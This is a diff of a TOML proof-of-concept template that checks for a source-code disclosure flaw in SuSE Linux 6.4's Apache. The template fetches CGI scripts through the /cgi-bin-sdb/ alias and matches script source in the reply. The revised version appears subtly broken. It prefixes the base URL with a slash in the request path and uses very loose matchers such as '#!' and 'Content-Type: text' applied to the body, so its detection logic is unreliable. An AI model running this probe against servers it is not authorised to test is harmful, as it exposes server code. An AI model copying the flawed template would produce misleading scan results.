@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 SuSE Linux 6.4 默认 Apache 配置中 /cgi-bin-sdb/ 别名导致的 CGI 脚本源代码泄露漏洞"
+description = "检测 SuSE Linux 6.4 的 Apache 1.3.12 是否因默认配置的 /cgi-bin/ 与 /cgi-bin-sdb/ 脚本目录映射错误，导致未经认证的远程访问者可通过将请求路径中的 /cgi-bin/ 替换为 /cgi-bin-sdb/ 绕过 CGI 脚本限制，从而读取 CGI 脚本源代码。通过请求疑似 CGI 脚本路径并匹配返回内容中的脚本源码特征来判断漏洞是否存在。"
 id = "POC-AVE-2000-0983"
-name = "CVE-2000-0868 PoC"
+name = "SuSE Linux Apache 读取源代码漏洞 PoC"
 severity = "medium"
 tags = ["ave-2000-0983"]
 vuln_id = [
@@ -11,80 +11,33 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/cgi-bin-sdb/test-cgi"
+path = "/{{BaseURL}}/cgi-bin-sdb/test.cgi"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "#!/usr/bin/perl",
-    "#!/bin/sh",
-    "#!/bin/bash",
-    "#!/usr/bin/python",
-    "#!/usr/local/bin/perl",
-    "#!/usr/bin/env perl",
-    "#!/usr/bin/env python",
+    "Content-Type: text/plain",
+    "Content-Type: text",
+    "#!/usr",
+    "#!",
 ]
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin-sdb/printenv"
-protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
-type = "word"
-words = [
-    "#!/usr/bin/perl",
-    "#!/bin/sh",
-    "#!/bin/bash",
-    "#!/usr/bin/python",
-    "#!/usr/local/bin/perl",
-    "#!/usr/bin/env perl",
-    "#!/usr/bin/env python",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin-sdb/phf"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "#!/usr/bin/perl",
-    "#!/bin/sh",
-    "#!/bin/bash",
-    "#!/usr/bin/python",
-    "#!/usr/local/bin/perl",
-    "#!/usr/bin/env perl",
-    "#!/usr/bin/env python",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin-sdb/count.cgi"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "#!/usr/bin/perl",
-    "#!/bin/sh",
-    "#!/bin/bash",
-    "#!/usr/bin/python",
-    "#!/usr/local/bin/perl",
-    "#!/usr/bin/env perl",
-    "#!/usr/bin/env python",
-]
+status = [200]
+type = "status"
